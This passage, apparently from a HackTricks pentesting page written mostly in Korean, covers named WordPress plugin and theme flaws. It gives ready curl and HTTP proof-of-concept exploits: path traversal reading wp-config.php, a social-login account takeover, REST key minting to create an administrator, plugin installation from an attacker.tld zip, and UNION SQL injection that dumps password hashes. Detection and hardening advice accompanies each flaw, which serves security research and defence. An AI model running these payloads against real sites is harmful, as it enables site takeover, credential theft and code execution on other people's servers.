echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name`은 공격자가 제어하며 **without sanitisation** 상태로 이어붙여집니다. 다시 말하면, 유일한 장벽은 이력서 페이지에서 가져올 수 있는 **CSRF nonce**입니다.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
서버가 `wp-config.php`의 내용을 반환하여 DB credentials와 auth keys를 leak한다.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

많은 테마/플러그인은 admin-ajax.php를 통해 노출되는 "social login" 헬퍼를 포함한다. 인증되지 않은 AJAX 액션(wp_ajax_nopriv_...)이 provider 데이터가 없을 때 클라이언트가 제공한 식별자를 신뢰하고 wp_set_auth_cookie()를 호출하면, 이는 완전한 인증 우회가 된다.

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
왜 취약한가

- 인증 없이 admin-ajax.php를 통해 접근 가능 (wp_ajax_nopriv_… action).
- 상태 변경 전에 nonce/capability 체크 없음.
- OAuth/OpenID provider 검증 누락; default branch가 공격자 입력을 수용함.
- get_user_by('email', $_POST['id']) 다음에 wp_set_auth_cookie($uid)를 호출하면 요청자를 기존 이메일 주소 중 하나로 인증함.

악용 (비인증)

- 전제조건: 공격자가 /wp-admin/admin-ajax.php에 접근할 수 있고 유효한 사용자 이메일을 알고 있거나 추측할 수 있음.
- provider를 지원되지 않는 값으로 설정(또는 생략)하여 default branch를 타게 한 뒤 id=<victim_email>를 전달.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- 클라이언트 입력으로부터 신원을 유추하지 마세요. 검증된 provider 토큰/ID에서 유래한 이메일/ID만 허용하십시오.
- 로그인 헬퍼에도 CSRF nonces 및 capability checks를 요구하세요; 불필요한 경우 wp_ajax_nopriv_ 등록을 피하십시오.
- OAuth/OIDC 응답을 서버 측에서 검증하고 확인하세요; 누락되었거나 유효하지 않은 공급자(provider)는 거부하십시오(POST id로의 폴백 금지).
- 수정될 때까지 소셜 로그인을 일시적으로 비활성화하거나 엣지에서 취약한 액션을 차단하는 방식으로 가상 패치를 고려하세요.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)

일부 플러그인은 호출자의 권한을 검증하지 않고 재사용 가능한 “connection keys” 또는 토큰을 발급하는 REST 엔드포인트를 노출합니다. 경로가 추측 가능한 속성(예: username)만으로 인증하고 키를 사용자/세션에 capability checks로 바인딩하지 않으면, 모든 미인증 공격자가 키를 발급(mint)하여 권한 있는 동작(관리자 계정 생성, 플러그인 액션 → RCE)을 실행할 수 있습니다.

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Why it’s exploitable
- 민감한 REST route가 낮은 엔트로피의 신원 증명(username)으로만 보호되거나 permission_callback이 누락됨
- capability 검사가 없음; 발급된 key가 범용 우회로로 수용됨

Detection checklist
- register_rest_route(..., [ 'permission_callback' => '__return_true' ]) 를 찾기 위해 플러그인 코드를 grep
- 요청으로 제공된 신원(username/email)을 기반으로 토큰/키를 발급하되 이를 인증된 사용자나 capability와 연결하지 않는 모든 route
- 서버 측 capability 검사 없이 발급된 token/key를 수용하는 후속 route를 찾아라

Hardening
- 권한이 필요한 모든 REST route에 대해: 필요한 capability에 대해 current_user_can()을 적용하는 permission_callback 요구
- 클라이언트가 제공한 신원으로 장기 유효 키를 발급하지 마라; 필요한 경우 인증 후 단명, 사용자 바인딩된 토큰을 발급하고 사용 시 capability를 다시 확인하라
- 호출자의 사용자 컨텍스트를 검증하라 (wp_set_current_user만으로는 충분하지 않음) 그리고 !is_user_logged_in() || !current_user_can(<cap>) 인 요청은 거부하라

---

## Nonce gate misuse → unauthenticated arbitrary plugin installation (FunnelKit Automations ≤ 3.5.3)

Nonces는 CSRF를 방지하지만 권한 부여를 대체하지 않는다. 코드가 nonce 통과를 일종의 허가 신호로 간주하고 권한이 필요한 작업(예: install/activate plugins)에 대한 capability 검사를 건너뛰면, 인증되지 않은 공격자는 약한 nonce 요구를 충족시켜 백도어가 심긴 또는 취약한 플러그인을 설치함으로써 RCE에 도달할 수 있다.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce “passes”
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
탐지 체크리스트
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

하드닝
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## depicter-* 액션의 s (search) 파라미터를 통한 인증되지 않은 SQLi (Depicter Slider ≤ 3.6.1)

여러 depicter-* 액션이 s (search) 파라미터를 사용해 이를 파라미터화 없이 SQL 쿼리에 연결했다.

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
탐지 체크리스트
- grep으로 depicter-* action 핸들러와 SQL에서 $_GET['s'] 또는 $_POST['s']의 직접 사용을 찾아보세요
- $wpdb->get_results()/query()로 전달되는 커스텀 쿼리에서 s를 연결(concatenating)하는 부분을 검토하세요

보안 강화
- 항상 $wpdb->prepare()나 wpdb 플레이스홀더를 사용하고; 예상치 못한 메타문자는 서버 측에서 차단하세요
- s에 대해 엄격한 허용 목록을 추가하고 예상된 문자셋/길이로 정규화하세요

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ≤ 2.5.1)

템플릿 파라미터에서 공격자가 제어하는 경로를 정규화/제한 없이 수락하면 임의의 로컬 파일을 읽을 수 있고, includable PHP/log 파일이 런타임에 포함되면 경우에 따라 코드 실행으로 이어질 수 있습니다.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: 정규화/허용 목록 없음; 디렉터리 트래버설 허용
- Impact: 기밀 노출 (wp-config.php), 특정 환경에서는 잠재적 RCE (로그 포이즈닝, includable PHP)

PoC – wp-config.php 읽기
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
탐지 체크리스트
- 요청 경로를 realpath() containment 없이 include()/require()/read sink에 이어붙이는 핸들러가 있는지 확인
- 의도된 templates 디렉터리 밖으로 벗어나는 traversal 패턴 (../)을 확인

하드닝
- Allowlisted 템플릿을 강제함; realpath()로 해석하고 require str_starts_with(realpath(file), realpath(allowed_base))
- 입력을 정규화함; traversal 시퀀스와 절대 경로를 거부함; sanitize_file_name()은 파일명(전체 경로가 아님)에만 사용


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
